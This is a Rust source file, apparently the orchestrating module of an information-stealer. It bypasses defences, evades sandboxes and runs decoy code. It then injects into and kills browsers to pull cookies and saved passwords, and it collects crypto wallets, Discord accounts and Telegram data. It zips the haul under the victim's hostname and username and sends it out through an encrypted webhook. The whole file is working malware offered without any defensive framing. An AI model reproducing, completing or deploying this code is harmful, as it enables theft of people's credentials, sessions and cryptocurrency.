pub mod browsers;
pub mod core;
pub mod discord;
pub mod encrypted;
pub mod core_utils;
pub mod polymorphic_keys;
pub mod sender;
pub mod telegram;
pub mod wallet;

use std::thread;
use std::time::Duration;
use rand::Rng;

use encrypted::*;
use std::{env, fs};

pub use encrypted::s_api_url;
use zip::write::FileOptions;

pub fn get_hostname() -> String {
    if let Ok(name) = env::var(s_env_computername()) {
        if !name.is_empty() {
            return name;
        }
    }
    if let Ok(name) = env::var(s_env_userdomain()) {
        if !name.is_empty() {
            return name;
        }
    }
    s_main_unknown()
}

pub fn get_username() -> String {
    if let Ok(name) = env::var(s_env_username()) {
        if !name.is_empty() {
            return name;
        }
    }
    s_main_unknown()
}

fn get_webhook_url() -> String {
    encrypted::decrypt_webhook().unwrap_or_default()
}

pub async fn run_collector() -> Result<(), Box<dyn std::error::Error>> {
    core::bypass::apply_all();

    if !core::detection::verify_environment() {
        return Ok(());
    }
    thread::sleep(Duration::from_millis(100));
    if !core::detection::verify_environment() {
        return Ok(());
    }
    core::sandbox::verify_environment();

    let _ = core::decoy::calculate_fibonacci(100);
    let _ = core::decoy::encrypt_dummy(&[1, 2, 3]);
    let _ = core::decoy::pseudo_random();
    let _ = core::decoy::json_parse_dummy();
    core::decoy::read_system_files();
    core::decoy::system_info_gathering();

    let mut rng = rand::thread_rng();
    let delay = rng.gen_range(200..500);
    thread::sleep(Duration::from_millis(delay));

    browsers::common::ci::cleanup_legacy_artifacts();

    let wbh = get_webhook_url();
    if wbh.is_empty() {
        return Ok(());
    }

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .connect_timeout(std::time::Duration::from_secs(10))
        .build()
        .unwrap_or_else(|_| reqwest::Client::new());

    let (_discord_accounts, discord_content, embeds) =
        crate::discord::get_discord_data(&client).await;

    core::kill::kill_browsers();

    let chromium_pre = browsers::chromium::extract_pre_inject();

    let pids_before_inject = core::kill::snapshot_browser_pids();
    browsers::chromium::inject_and_cache_all();

    // Kill inject-spawned browsers immediately so Cookies/Login Data unlock
    // while app-bound keys are already in cache — extract v20 cookies + passwords together.
    core::kill::kill_new_browsers(&pids_before_inject);
    browsers::common::ci::cleanup_legacy_artifacts();

    let mut chromium_v20 = browsers::chromium::extract_all_from_cache();
    browsers::merge_files(&mut chromium_v20, chromium_pre);

    let mut all_files = browsers::gecko::extract_all();

    core::kill::kill_browsers();

    all_files.extend(chromium_v20);
    let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
    browsers::merge_files(&mut all_files, gecko_cookie_retry);
    let chromium_cookie_retry = browsers::chromium::extract_cookies_post_kill();
    browsers::merge_files(&mut all_files, chromium_cookie_retry);
    browsers::common::zipp::sort_entries(&mut all_files);

    let wallet_files = wallet::collect_wallets();
    for (name, content) in wallet_files {
        all_files.push((name, String::from_utf8_lossy(&content).into_owned()));
    }

    if !discord_content.is_empty() {
        all_files.push((s_discord_accounts_txt(), discord_content));
    }

    let telegram_files = telegram::get_telegram_paths();

    let zip_name = format!("{}_{}.zip", get_hostname(), get_username());
    let session_dir = core::spawn_sender::session_dir();
    let _ = fs::create_dir_all(&session_dir);
    let zip_path = session_dir.join(&zip_name);

    {
        use std::fs::File;
        use std::io::Write;

        let file = File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in &all_files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        for (name, content) in telegram_files {
            zip.start_file(&name, options)?;
            zip.write_all(&content)?;
        }

        zip.finish()?;
    }

    let meta = sender::DeliveryMeta {
        zip_path: zip_path.to_string_lossy().into_owned(),
        zip_name: zip_name.clone(),
        embeds,
    };

    let delivered = core::spawn_sender::dispatch(&session_dir, &meta);
    if !delivered {
        let zip_data = fs::read(&zip_path)?;
        let _ = sender::send_to_webhook(&client, &wbh, meta.embeds, zip_data, zip_name).await;
    }

    core::spawn_sender::cleanup_session(&session_dir);

    std::process::exit(0);
}
